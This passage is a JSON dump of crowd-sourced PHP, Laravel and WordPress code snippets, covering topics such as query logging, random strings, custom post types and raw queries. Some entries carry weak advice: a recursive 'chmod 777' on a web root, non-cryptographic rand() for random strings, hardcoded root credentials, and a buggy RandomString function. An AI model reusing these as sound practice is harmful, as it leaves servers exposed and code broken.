    "description": "DB::enableQueryLog(); $users = User::select(\"*\")->get(); $quries = DB::getQueryLog(); dd($quries); DB::table('users')->toSql(); dd($query);\n$query = str_replace(array('?'), array('\\'%s\\''), $builder->toSql()); $query = vsprintf($query, $builder->getBindings()); dump($query);\nUse the toSql() method on a QueryBuilder instance.  DB::table('users')->toSql()\n",
    "reg_date": "2021-10-12T10:19:49.000Z"
  },
  {
    "id": 4464,
    "keyword": null,
    "link": null,
    "title": " print session in laravel",
    "description": "dd(session()->all());\n",
    "reg_date": "2021-10-12T10:19:49.000Z"
  },
  {
    "id": 4465,
    "keyword": null,
    "link": null,
    "title": " print sql query result as an array php",
    "description": "<?php $connection = mysqli_connect( 'localhost', 'root', 'dbPass' ); if ( !$connection ) {     die( 'Database Connection Failed' . mysqli_error( $connection ) ); } $select_db = mysqli_select_db( $connection, 'sample_login' ); if ( !$select_db ) {     die( 'Database Selection Failed' . mysqli_error( $connection ) ); } $query = 'SELECT * FROM login';  $result = mysqli_query( $connection, $query ); $stack = array(); while( $row = mysqli_fetch_array( $result, MYSQLI_ASSOC ) ) {     array_push( $stack, $row ); } //Stop the code here if you just want it as a PHP array  //(Don't forget the PHP closing tag) if you do that though //If you want to carry on and convert the PHP array to a JavaScript array //Include the rest of this code  $theArray = json_encode( $stack ); print_r( $theArray ); ?> <script> var theArray = <?php echo $theArray ?> ; console.log(theArray); </script>   \n",
    "reg_date": "2021-10-12T10:19:49.000Z"
  },
  {
    "id": 4466,
    "keyword": null,
    "link": null,
    "title": " print url in view yii2",
    "description": "$currentUrl = Yii::$app->request->url; //gives current URL\n",
    "reg_date": "2021-10-12T10:19:49.000Z"
  },
  {
    "id": 4467,
    "keyword": null,
    "link": null,
    "title": " print value in laravel console",
    "description": "dump($var); dd($id); var_dump($var); die($var); print_r($var);\n",
    "reg_date": "2021-10-12T10:19:49.000Z"
  },
  {
    "id": 4468,
    "keyword": null,
    "link": null,
    "title": " printing a statment in php",
    "description": " <?php   echo \"<h2>PHP is Fun!</h2>\";   echo \"Hello world!<br>\"; echo \"I'm about to learn PHP!<br>\";   echo \"This \", \"string \", \"was \", \"made \", \"with multiple parameters.\";  ?>  \n",
    "reg_date": "2021-10-12T10:19:49.000Z"
  },
  {
    "id": 4469,
    "keyword": null,
    "link": null,
    "title": " program-generate-random-alphabets using php",
    "description": "function generateRandomString($length = 25) {     $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';     $charactersLength = strlen($characters);     $randomString = '';     for ($i = 0; $i < $length; $i++) {         $randomString .= $characters[rand(0, $charactersLength - 1)];     }     return $randomString; } //usage  $myRandomString = generateRandomString(5);\nfunction rand_str() {     $characters = '0123456789-=+{}[]:;@#~.?/&gt;,&lt;|\\!\"&pound;$%^&amp;*()abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';     $randomstr = '';     for ($i = 0; $i < random_int(50, 100); $i++) {       $randomstr .= $characters[rand(0, strlen($characters) - 1)];     }     return $randomstr;   }\n",
    "reg_date": "2021-10-12T10:19:50.000Z"
  },
  {
    "id": 4470,
    "keyword": null,
    "link": null,
    "title": " program logic for second largest number in an array in php",
    "description": "function secondHighest(array $arr) {          sort($arr);          echo $arr[sizeof($arr)-2]; }     secondHighest(array( 4, 9, 5, 2, 8, 0, 3, 22)); \n",
    "reg_date": "2021-10-12T10:19:50.000Z"
  },
  {
    "id": 4471,
    "keyword": null,
    "link": null,
    "title": " proper permission webserver laravel",
    "description": "sudo chmod -R 777 path/to/root sudo chown -R www-data:www-data /path/to/root sudo usermod -a -G www-data ubuntu sudo find /path/to/root -type f -exec chmod 644 {} \\; sudo find /path/to/root -type d -exec chmod 755 {} \\; sudo chgrp -R www-data storage bootstrap/cache sudo chmod -R ug+rwx storage bootstrap/cache\n",
    "reg_date": "2021-10-12T10:19:50.000Z"
  },
  {
    "id": 4472,
    "keyword": null,
    "link": null,
    "title": " protected gaurded in laravel",
    "description": "protected $guarded = [];\n",
    "reg_date": "2021-10-12T10:19:50.000Z"
  },
  {
    "id": 4473,
    "keyword": null,
    "link": null,
    "title": " protected table laravel",
    "description": "protected $table=\"mytable\";\n# The easiest way to create a model instance is using the  # make:model Artisan command:  php artisan make:model Flight  # If you would like to generate a database migration when you  # generate the model, you may use the --migration or -m option:  php artisan make:model Flight --migration php artisan make:model Flight -m\n    /**      * The attributes that are mass assignable.      */     protected $fillable = [       \t\t\t\t\t   'title',                            'slug',                            'body',                            'image',                            'published',                            'comments_open'                           ];\n// Retrieve flight by name, or create it if it doesn't exist... $flight = App\\Flight::firstOrCreate(['name' => 'Flight 10']);  // Retrieve flight by name, or create it with the name, delayed, and arrival_time attributes... $flight = App\\Flight::firstOrCreate(     ['name' => 'Flight 10'],     ['delayed' => 1, 'arrival_time' => '11:30'] );  // Retrieve by name, or instantiate... $flight = App\\Flight::firstOrNew(['name' => 'Flight 10']);  // Retrieve by name, or instantiate with the name, delayed, and arrival_time attributes... $flight = App\\Flight::firstOrNew(     ['name' => 'Flight 10'],     ['delayed' => 1, 'arrival_time' => '11:30'] );\n// If there's a flight from Oakland to San Diego, set the price to $99. // If no matching model exists, create one. $flight = App\\Models\\Flight::updateOrCreate(     ['departure' => 'Oakland', 'destination' => 'San Diego'],     ['price' => 99, 'discounted' => 1] );\n$flight = App\\Models\\Flight::find(1);  $flight->name = 'New Flight Name';  $flight->save();\n",
    "reg_date": "2021-10-12T10:19:50.000Z"
  },
  {
    "id": 4474,
    "keyword": null,
    "link": null,
    "title": " public laravel htaccess",
    "description": "<IfModule mod_rewrite.c> Options +FollowSymLinks RewriteEngine On  RewriteCond %{REQUEST_URI} !^/public/   RewriteCond %{REQUEST_FILENAME} !-d RewriteCond %{REQUEST_FILENAME} !-f    RewriteRule ^(.*)$ /public/$1  #RewriteRule ^ index.php [L] RewriteRule ^(/)?$ public/index.php [L]  </IfModule> \n<IfModule mod_rewrite.c> RewriteEngine On RewriteRule ^(.*)$ public/$1 [L] </IfModule>\n",
    "reg_date": "2021-10-12T10:19:50.000Z"
  },
  {
    "id": 4475,
    "keyword": null,
    "link": null,
    "title": " publish config laravel",
    "description": "php artisan vendor:publish --provider=\"PWParsons\\PayGate\\PayGateServiceProvider\" --tag=\"config\"\n",
    "reg_date": "2021-10-12T10:19:50.000Z"
  },
  {
    "id": 4476,
    "keyword": null,
    "link": null,
    "title": " pull information from another website",
    "description": "///Display the whole page <iframe src=\"https://www.example.org/\"></iframe> ///Fetch website contents(needs PHP). $mystring = file_get_contents(\"https://www.example.org/\")\n",
    "reg_date": "2021-10-12T10:19:50.000Z"
  },
  {
    "id": 4477,
    "keyword": null,
    "link": null,
    "title": " push key value array php",
    "description": "$a = array(\"key1\"=>\"value1\", \"key2\"=>\"value2\");  // to append \"key3\" - \"value3\": $a[\"key3\"] = \"value3\"\n",
    "reg_date": "2021-10-12T10:19:50.000Z"
  },
  {
    "id": 4478,
    "keyword": null,
    "link": null,
    "title": " pusher-php-server laravel",
    "description": "composer require pusher/pusher-php-server\n",
    "reg_date": "2021-10-12T10:19:50.000Z"
  },
  {
    "id": 4479,
    "keyword": null,
    "link": null,
    "title": " put img in timestamp using php",
    "description": " $ext = explode('.', $image_name);             $file_name = $ext[0];             $file_ext = $ext[1];             $new_file = $file_name . '_' . time() . '.' . $file_ext;        //time() returns unix format\n",
    "reg_date": "2021-10-12T10:19:51.000Z"
  },
  {
    "id": 4480,
    "keyword": null,
    "link": null,
    "title": " put woocommerce orders on pending payment automatically",
    "description": "add_action( 'woocommerce_thankyou', 'woocommerce_thankyou_change_order_status', 10, 1 ); function woocommerce_thankyou_change_order_status( $order_id ){     if( ! $order_id ) return;      $order = wc_get_order( $order_id );      if( $order->get_status() == 'processing' )         $order->update_status( 'pending' ); } \n",
    "reg_date": "2021-10-12T10:19:51.000Z"
  },
  {
    "id": 4481,
    "keyword": null,
    "link": null,
    "title": " query custom post type",
    "description": "  <?php       \t   $args = array(         'post_type' => 'custom_type',       'post_status' => 'publish',       'posts_per_page' => 8,        'orderby' => 'title',        'order' => 'ASC',            );    $loop = new WP_Query( $args );     while ( $loop->have_posts() ) : $loop->the_post();        print the_title();        the_excerpt();    endwhile;    wp_reset_postdata();    ?>\n<?php $args = array(     'post_type'      => 'product',     'posts_per_page' => 10, ); $loop = new WP_Query($args); while ( $loop->have_posts() ) {     $loop->the_post();     ?>     <div class=\"entry-content\">         <?php the_title(); ?>         <?php the_content(); ?>     </div>     <?php } \n/* * Creating a function to create our CPT */   function custom_post_type() {   // Set UI labels for Custom Post Type     $labels = array(         'name'                => _x( 'Movies', 'Post Type General Name', 'twentytwenty' ),         'singular_name'       => _x( 'Movie', 'Post Type Singular Name', 'twentytwenty' ),         'menu_name'           => __( 'Movies', 'twentytwenty' ),         'parent_item_colon'   => __( 'Parent Movie', 'twentytwenty' ),         'all_items'           => __( 'All Movies', 'twentytwenty' ),         'view_item'           => __( 'View Movie', 'twentytwenty' ),         'add_new_item'        => __( 'Add New Movie', 'twentytwenty' ),         'add_new'             => __( 'Add New', 'twentytwenty' ),         'edit_item'           => __( 'Edit Movie', 'twentytwenty' ),         'update_item'         => __( 'Update Movie', 'twentytwenty' ),         'search_items'        => __( 'Search Movie', 'twentytwenty' ),         'not_found'           => __( 'Not Found', 'twentytwenty' ),         'not_found_in_trash'  => __( 'Not found in Trash', 'twentytwenty' ),     );       // Set other options for Custom Post Type           $args = array(         'label'               => __( 'movies', 'twentytwenty' ),         'description'         => __( 'Movie news and reviews', 'twentytwenty' ),         'labels'              => $labels,         // Features this CPT supports in Post Editor         'supports'            => array( 'title', 'editor', 'excerpt', 'author', 'thumbnail', 'comments', 'revisions', 'custom-fields', ),         // You can associate this CPT with a taxonomy or custom taxonomy.          'taxonomies'          => array( 'genres' ),         /* A hierarchical CPT is like Pages and can have         * Parent and child items. A non-hierarchical CPT         * is like Posts.         */          'hierarchical'        => false,         'public'              => true,         'show_ui'             => true,         'show_in_menu'        => true,         'show_in_nav_menus'   => true,         'show_in_admin_bar'   => true,         'menu_position'       => 5,         'can_export'          => true,         'has_archive'         => true,         'exclude_from_search' => false,         'publicly_queryable'  => true,         'capability_type'     => 'post',         'show_in_rest' => true,       );           // Registering your Custom Post Type     register_post_type( 'movies', $args );   }   /* Hook into the 'init' action so that the function * Containing our post type registration is not  * unnecessarily executed.  */   add_action( 'init', 'custom_post_type', 0 );\n//WordPress: Query a custom post type //For example, query all Case Study post types  <?php query_posts('post_type=case_studies'); ?>\n.wp-block-code { \tborder: 0; \tpadding: 0; }  .wp-block-code > div { \toverflow: auto; }  .hljs { \tbox-sizing: border-box; }  .hljs.shcb-code-table { \tdisplay: table; \twidth: 100%; }  .hljs.shcb-code-table > .shcb-loc { \tcolor: inherit; \tdisplay: table-row; \twidth: 100%; }  .hljs.shcb-code-table .shcb-loc > span { \tdisplay: table-cell; }  .wp-block-code code.hljs:not(.shcb-wrap-lines) { \twhite-space: pre; }  .wp-block-code code.hljs.shcb-wrap-lines { \twhite-space: pre-wrap; }  .hljs.shcb-line-numbers { \tborder-spacing: 0; \tcounter-reset: line; }  .hljs.shcb-line-numbers > .shcb-loc { \tcounter-increment: line; }  .hljs.shcb-line-numbers .shcb-loc > span { \tpadding-left: 0.75em; }  .hljs.shcb-line-numbers .shcb-loc::before { \tborder-right: 1px solid #ddd; \tcontent: counter(line); \tdisplay: table-cell; \tpadding: 0 0.75em; \ttext-align: right; \t-webkit-user-select: none; \t-moz-user-select: none; \t-ms-user-select: none; \tuser-select: none; \twhite-space: nowrap; \twidth: 1%; } // Register Custom Post Type - Workshop function kp_workshops() {  \t$args = array( \t\t'label' =>; __( 'Workshop', 'kp_workshops' ), \t\t'description' =>; __( 'Workshop listing', 'kp_workshops' ), \t\t'labels' =>; $labels, \t\t'supports' =>; array( 'title', 'editor', 'thumbnail', 'comments', 'revisions', 'custom-fields' ), \t\t'taxonomies' =>; array( 'category' ), \t\t'hierarchical' =>; false, \t\t'public' =>; true, \t\t'show_ui' =>; true, \t\t'show_in_menu' =>; true, \t\t'menu_position' =>; 20, \t\t'menu_icon' =>; 'dashicons-welcome-learn-more', \t\t'show_in_admin_bar' =>; true, \t\t'show_in_nav_menus' =>; true, \t\t'can_export' =>; true, \t\t'has_archive' =>; true, \t\t'exclude_from_search' =>; false, \t\t'publicly_queryable' =>; true, \t\t'capability_type' =>; 'page', \t\t'show_in_rest' =>; true, \t);  \tregister_post_type( 'workshops', $args );  } add_action( 'init', 'kp_workshops', 0 );\nCustom Post Type Query Loop\n",
    "reg_date": "2021-10-12T10:19:51.000Z"
  },
  {
    "id": 4482,
    "keyword": null,
    "link": null,
    "title": " query php",
    "description": "$sql = \"SELECT id, firstname, lastname FROM MyGuests\"; $result = $conn->query($sql);  if ($result->num_rows > 0) {     // output data of each row     while($row = $result->fetch_assoc()) {         echo \"id: \" . $row[\"id\"]. \" - Name: \" . $row[\"firstname\"]. \" \" . $row[\"lastname\"]. \"<br>\";     } } else {     echo \"0 results\"; } $conn->close();\n<?php  // MySqli connection $mysqli = new mysqli(\"localhost\", \"my_username\", \"my_password\", \"my_database\");  // Errors if($mysqli->connect_error) {   echo \"<b>Failed to connect to MySQL: </b>\" . $mysqli->connect_error; }  // Query $selectQuery = $mysqli->prepare(\"SELECT * FROM my_table\"); $selectQuery->execute(); $selectQueryResult = $selectQuery->get_result();  // Loop  while($selectQueryRow = $selectQueryResult->fetch_array()) {   echo $selectQueryRow['my_column']; }  // Example $selectUsername = $mysqli->prepare(\"SELECT * FROM users\"); $selectUsername->execute(); $selectUsernameResult = $selectUsername->get_result(); while($selectUsernameRow = $selectUsernameResult->fetch_array()) {   echo $selectUsernameRow['username']; }\n <?php $sql =  'SELECT name, color, calories FROM fruit ORDER BY name'; foreach  ($conn->query($sql) as $row) {     print $row['name'] . \"\\t\";     print  $row['color'] . \"\\t\";     print $row['calories'] . \"\\n\"; } ?>  \nxPaw\\SourceQuery\\Exception\\InvalidPacketException: Failed to read any data from socket in C:\\xampp\\htdocs\\minecraft\\vendor\\xpaw\\php-source-query-class\\SourceQuery\\BaseSocket.php:50 Stack trace: #0 C:\\xampp\\htdocs\\minecraft\\vendor\\xpaw\\php-source-query-class\\SourceQuery\\Socket.php(76): xPaw\\SourceQuery\\BaseSocket->ReadInternal(Object(xPaw\\SourceQuery\\Buffer), 1400, Array) #1 C:\\xampp\\htdocs\\minecraft\\vendor\\xpaw\\php-source-query-class\\SourceQuery\\SourceQuery.php(212): xPaw\\SourceQuery\\Socket->Read() #2 C:\\xampp\\htdocs\\minecraft\\View.php(27): xPaw\\SourceQuery\\SourceQuery->GetInfo() #3 {main}\n",
    "reg_date": "2021-10-12T10:19:51.000Z"
  },
  {
    "id": 4483,
    "keyword": null,
    "link": null,
    "title": " query sort alphabetically wp",
    "description": "$args = array(     'orderby' => 'title',     'order'   => 'DESC', );\n",
    "reg_date": "2021-10-12T10:19:51.000Z"
  },
  {
    "id": 4484,
    "keyword": null,
    "link": null,
    "title": " query sql in php",
    "description": "$sql = \"SELECT id, firstname, lastname FROM MyGuests\"; $result = $conn->query($sql);  if ($result->num_rows > 0) {     // output data of each row     while($row = $result->fetch_assoc()) {         echo \"id: \" . $row[\"id\"]. \" - Name: \" . $row[\"firstname\"]. \" \" . $row[\"lastname\"]. \"<br>\";     } } else {     echo \"0 results\"; } $conn->close();\n<?php  // MySqli connection $mysqli = new mysqli(\"localhost\", \"my_username\", \"my_password\", \"my_database\");  // Errors if($mysqli->connect_error) {   echo \"<b>Failed to connect to MySQL: </b>\" . $mysqli->connect_error; }  // Query $selectQuery = $mysqli->prepare(\"SELECT * FROM my_table\"); $selectQuery->execute(); $selectQueryResult = $selectQuery->get_result();  // Loop  while($selectQueryRow = $selectQueryResult->fetch_array()) {   echo $selectQueryRow['my_column']; }  // Example $selectUsername = $mysqli->prepare(\"SELECT * FROM users\"); $selectUsername->execute(); $selectUsernameResult = $selectUsername->get_result(); while($selectUsernameRow = $selectUsernameResult->fetch_array()) {   echo $selectUsernameRow['username']; }\n",
    "reg_date": "2021-10-12T10:19:51.000Z"
  },
  {
    "id": 4485,
    "keyword": null,
    "link": null,
    "title": " quick sort php",
    "description": "<?php function quick_sort($my_array)  { \t$loe = $gt = array(); \tif(count($my_array) < 2) \t{ \t\treturn $my_array; \t} \t$pivot_key = key($my_array); \t$pivot = array_shift($my_array); \tforeach($my_array as $val) \t{ \t\tif($val <= $pivot) \t\t{ \t\t\t$loe[] = $val; \t\t}elseif ($val > $pivot) \t\t{ \t\t\t$gt[] = $val; \t\t} \t} \treturn array_merge(quick_sort($loe),array($pivot_key=>$pivot),quick_sort($gt)); }  \n",
    "reg_date": "2021-10-12T10:19:51.000Z"
  },
  {
    "id": 4486,
    "keyword": null,
    "link": null,
    "title": " radio selected",
    "description": "  <input type=\"radio\" id=\"huey\" name=\"drone\" value=\"huey\"          checked>  <!-- https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/radio-->\n<form>   <p>Veuillez choisir la meilleure m&eacute;thode pour vous contacter :</p>   <div>     <input type=\"radio\" id=\"contactChoice1\"      name=\"contact\" value=\"email\">     <label for=\"contactChoice1\">Email</label>      <input type=\"radio\" id=\"contactChoice2\"      name=\"contact\" value=\"telephone\">     <label for=\"contactChoice2\">T&eacute;l&eacute;phone</label>      <input type=\"radio\" id=\"contactChoice3\"      name=\"contact\" value=\"courrier\">     <label for=\"contactChoice3\">Courrier</label>   </div>   <div>     <button type=\"submit\">Envoyer</button>   </div> </form>\n//checked   <input type=\"radio\" id=\"huey\" name=\"drone\" value=\"huey\"          checked>\n",
    "reg_date": "2021-10-12T10:19:51.000Z"
  },
  {
    "id": 4487,
    "keyword": null,
    "link": null,
    "title": " radiobutton php controller example",
    "description": "<form action=\"result.php\" method=\"post\">   Answer 1 <input type=\"radio\" name=\"ans\" value=\"ans1\" /><br />   Answer 2 <input type=\"radio\" name=\"ans\" value=\"ans2\"  /><br />   Answer 3 <input type=\"radio\" name=\"ans\" value=\"ans3\"  /><br />   Answer 4 <input type=\"radio\" name=\"ans\" value=\"ans4\"  /><br />   <input type=\"submit\" value=\"submit\" /> </form>    PHP code:  <?php  $answer = $_POST['ans'];   if ($answer == \"ans1\") {               echo 'Correct';       } else {     echo 'Incorrect'; }         ?>\n",
    "reg_date": "2021-10-12T10:19:52.000Z"
  },
  {
    "id": 4488,
    "keyword": null,
    "link": null,
    "title": " rand string php",
    "description": "function generateRandomString($length = 25) {     $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';     $charactersLength = strlen($characters);     $randomString = '';     for ($i = 0; $i < $length; $i++) {         $randomString .= $characters[rand(0, $charactersLength - 1)];     }     return $randomString; } //usage  $myRandomString = generateRandomString(5);\n//generates 13 character random unique alphanumeric id echo uniqid(); //output - 5e6d873a4f597\nfunction generateRandomString($length = 10) {     $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';     $charactersLength = strlen($characters);     $randomString = '';     for ($i = 0; $i < $length; $i++) {         $randomString .= $characters[rand(0, $charactersLength - 1)];     }     return $randomString; }  Output the random string with the call below:  // Echo the random string. // Optionally, you can give it a desired string length. echo generateRandomString();\nfunction rand_str() {     $characters = '0123456789-=+{}[]:;@#~.?/&gt;,&lt;|\\!\"&pound;$%^&amp;*()abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';     $randomstr = '';     for ($i = 0; $i < random_int(50, 100); $i++) {       $randomstr .= $characters[rand(0, strlen($characters) - 1)];     }     return $randomstr;   }\necho random_int(0,50);\n    function RandomString()     {         $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';         $randstring = '';         for ($i = 0; $i < 10; $i++) {             $randstring = $characters[rand(0, strlen($characters))];         }         return $randstring;     }\n",
    "reg_date": "2021-10-12T10:19:52.000Z"
  },
  {
    "id": 4489,
    "keyword": null,
    "link": null,
    "title": " random array php",
    "description": "$items = array(1, 2, 3, 4, 5); echo $items[array_rand($items)];\n<?php //array_rand ( array $array [, int $num = 1 ] )  $input = array(\"Neo\", \"Morpheus\", \"Trinity\", \"Cypher\", \"Tank\"); $rand_keys = array_rand($input, 2); echo $input[$rand_keys[0]] . \"\\n\"; echo $input[$rand_keys[1]] . \"\\n\"; ?>  \n$array = [\"a\", \"b\", \"c\"]; $random = $array[ Rand(0, count($array)-1) ];  echo $random; // a or b or c\n$colors=[\"red\",\"blue\",\"green\",\"orange\"]; echo $colors[array_rand($colors)];//green (or any color randomly)\n// $min and $max are optional rand($min,$max);\nrand(0,10); or random_int(0,10)\n",
    "reg_date": "2021-10-12T10:19:52.000Z"
  },
  {
    "id": 4490,
    "keyword": null,
    "link": null,
    "title": " random number generator in php",
    "description": "you can use rand() function for that in php. Example: Generate random numbers between 1 to 50 <?php   echo rand(1,50); ?>\n// $min and $max are optional rand($min,$max);\necho random_int(0,50);\n<?php   echo rand(1,50); ?>\nrand(0,10); or random_int(0,10)\necho (rand()); echo(rand(10, 100));//random number with range \n",
    "reg_date": "2021-10-12T10:19:52.000Z"
  },
  {
    "id": 4491,
    "keyword": null,
    "link": null,
    "title": " random number laravel faker",
    "description": "$faker->numerify('###-###-####'); // \"766-620-7004\"  $faker->numerify('##########'); // \"3579786681\"\n$this->faker->bothify('?###??##') // 1efr38qa\n",
    "reg_date": "2021-10-12T10:19:52.000Z"
  },
  {
    "id": 4492,
    "keyword": null,
    "link": null,
    "title": " random string generator php",
    "description": "function generateRandomString($length = 25) {     $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';     $charactersLength = strlen($characters);     $randomString = '';     for ($i = 0; $i < $length; $i++) {         $randomString .= $characters[rand(0, $charactersLength - 1)];     }     return $randomString; } //usage  $myRandomString = generateRandomString(5);\n//generates 13 character random unique alphanumeric id echo uniqid(); //output - 5e6d873a4f597\nfunction generateRandomString($length = 10) {     $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';     $charactersLength = strlen($characters);     $randomString = '';     for ($i = 0; $i < $length; $i++) {         $randomString .= $characters[rand(0, $charactersLength - 1)];     }     return $randomString; }  Output the random string with the call below:  // Echo the random string. // Optionally, you can give it a desired string length. echo generateRandomString();\nfunction rand_str() {     $characters = '0123456789-=+{}[]:;@#~.?/&gt;,&lt;|\\!\"&pound;$%^&amp;*()abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';     $randomstr = '';     for ($i = 0; $i < random_int(50, 100); $i++) {       $randomstr .= $characters[rand(0, strlen($characters) - 1)];     }     return $randomstr;   }\n/**  * Generate a random string, using a cryptographically secure   * pseudorandom number generator (random_int)  *  * This function uses type hints now (PHP 7+ only), but it was originally  * written for PHP 5 as well.  *   * For PHP 7, random_int is a PHP core function  * For PHP 5.x, depends on https://github.com/paragonie/random_compat  *   * @param int $length      How many characters do we want?  * @param string $keyspace A string of all possible characters  *                         to select from  * @return string  */ function random_str(     int $length = 64,     string $keyspace = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ' ): string {     if ($length < 1) {         throw new \\RangeException(\"Length must be a positive integer\");     }     $pieces = [];     $max = mb_strlen($keyspace, '8bit') - 1;     for ($i = 0; $i < $length; ++$i) {         $pieces []= $keyspace[random_int(0, $max)];     }     return implode('', $pieces); } \n<?php     function RandomString()     {         $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';         $randstring = '';         for ($i = 0; $i < 10; $i++) {             $randstring = $characters[rand(0, strlen($characters))];         }         return $randstring;     }      RandomString();     echo $randstring;\n",
    "reg_date": "2021-10-12T10:19:52.000Z"
  },
  {
    "id": 4493,
    "keyword": null,
    "link": null,
    "title": " random word using a wordlist php",
    "description": "// Read the whole file into a array. $file = file('File Location');  // Getting the Words Count in the file. $wCount = count($file);  // Printing out the random word. echo $file[rand(0, $wCount - 1)];  // This is a one liner. echo file('File Location')[rand(0, count(file('File Location')) - 1)];\n",
    "reg_date": "2021-10-12T10:19:52.000Z"
  },
  {
    "id": 4494,
    "keyword": null,
    "link": null,
    "title": " randomstring php",
    "description": "function generateRandomString($length = 25) {     $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';     $charactersLength = strlen($characters);     $randomString = '';     for ($i = 0; $i < $length; $i++) {         $randomString .= $characters[rand(0, $charactersLength - 1)];     }     return $randomString; } //usage  $myRandomString = generateRandomString(5);\n//generates 13 character random unique alphanumeric id echo uniqid(); //output - 5e6d873a4f597\nfunction generateRandomString($length = 10) {     $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';     $charactersLength = strlen($characters);     $randomString = '';     for ($i = 0; $i < $length; $i++) {         $randomString .= $characters[rand(0, $charactersLength - 1)];     }     return $randomString; }  Output the random string with the call below:  // Echo the random string. // Optionally, you can give it a desired string length. echo generateRandomString();\nfunction rand_str() {     $characters = '0123456789-=+{}[]:;@#~.?/&gt;,&lt;|\\!\"&pound;$%^&amp;*()abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';     $randomstr = '';     for ($i = 0; $i < random_int(50, 100); $i++) {       $randomstr .= $characters[rand(0, strlen($characters) - 1)];     }     return $randomstr;   }\n<?php      $random = substr(md5(mt_rand()), 0, 7);     echo $random; ?>\n<?php     function RandomString()     {         $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';         $randstring = '';         for ($i = 0; $i < 10; $i++) {             $randstring = $characters[rand(0, strlen($characters))];         }         return $randstring;     }      RandomString();     echo $randstring;\n",
    "reg_date": "2021-10-12T10:19:52.000Z"
  },
  {
    "id": 4495,
    "keyword": null,
    "link": null,
    "title": " randstring php",
    "description": "//generates 13 character random unique alphanumeric id echo uniqid(); //output - 5e6d873a4f597\nfunction rand_str() {     $characters = '0123456789-=+{}[]:;@#~.?/&gt;,&lt;|\\!\"&pound;$%^&amp;*()abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';     $randomstr = '';     for ($i = 0; $i < random_int(50, 100); $i++) {       $randomstr .= $characters[rand(0, strlen($characters) - 1)];     }     return $randomstr;   }\n<?php      $random = substr(md5(mt_rand()), 0, 7);     echo $random; ?>\n",
    "reg_date": "2021-10-12T10:19:53.000Z"
  },
  {
    "id": 4496,
    "keyword": null,
    "link": null,
    "title": " range in php",
    "description": " <?php    foreach (range(0, 12) as $number) {     echo $number; }  ?>\n<?php   // range($start, $end [,$steps])   $numbers = range(0, 5);   print_r($numbers);   // Array ( [0] => 0 [1] => 1 [2] => 2 [3] => 3 [4] => 4 [5] => 5 ) \t   $numbers2 = range(0, 5, 2);   print_r($numbers2);   //Array ( [0] => 0 [1] => 2 [2] => 4 )         ?>\n <?php // array(0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12) foreach (range(0, 12) as $number) {     echo $number; }  // The step parameter // array(0, 10, 20, 30, 40, 50, 60, 70, 80, 90, 100) foreach (range(0, 100, 10) as $number) {     echo $number; }  // Usage of character sequences // array('a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i'); foreach (range('a', 'i') as $letter) {     echo $letter; } // array('c', 'b', 'a'); foreach (range('c', 'a') as $letter) {     echo $letter; } ?>  \n",
    "reg_date": "2021-10-12T10:19:53.000Z"
  },
  {
    "id": 4497,
    "keyword": null,
    "link": null,
    "title": " raw queries in laravel",
    "description": "$someVariable = Input::get(\"some_variable\"); $results = DB::select( DB::raw(\"SELECT * FROM some_table WHERE some_col = :somevariable\"), array(    'somevariable' => $someVariable,  ));  DB::statement( 'ALTER TABLE HS_Request AUTO_INCREMENT=:incrementStart', array('incrementStart' => 9999) );\nuse Illuminate\\Support\\Facades\\DB;  $users = DB::select('select * from users');  foreach ($users as $user) {     echo $user->name; }\nDB::statement('UPDATE users SET role_id = 1 WHERE role_id IS NULL AND YEAR(created_at) > 2020');\n$results = DB::select('select * from users where id = :id', ['id' => 1]);\n@php     $counter = 1; @endphp\n",
    "reg_date": "2021-10-12T10:19:53.000Z"
  },
  {
    "id": 4498,
    "keyword": null,
    "link": null,
    "title": " raw query in laravel with parameters",
    "description": "$someVariable = Input::get(\"some_variable\"); $results = DB::select( DB::raw(\"SELECT * FROM some_table WHERE some_col = :somevariable\"), array(    'somevariable' => $someVariable,  ));  DB::statement( 'ALTER TABLE HS_Request AUTO_INCREMENT=:incrementStart', array('incrementStart' => 9999) );\n@php     $counter = 1; @endphp\n",
    "reg_date": "2021-10-12T10:19:53.000Z"
  },
  {
    "id": 4499,
    "keyword": null,
    "link": null,
    "title": " re migrate laravel",
    "description": "Try: composer dump-autoload php artisan config:cache  If not working also try: php artisan migrate:refresh.\nphp artisan migrate:status\n",
    "reg_date": "2021-10-12T10:19:53.000Z"
  },
  {
    "id": 4500,
    "keyword": null,
    "link": null,
    "title": " read an email with php",
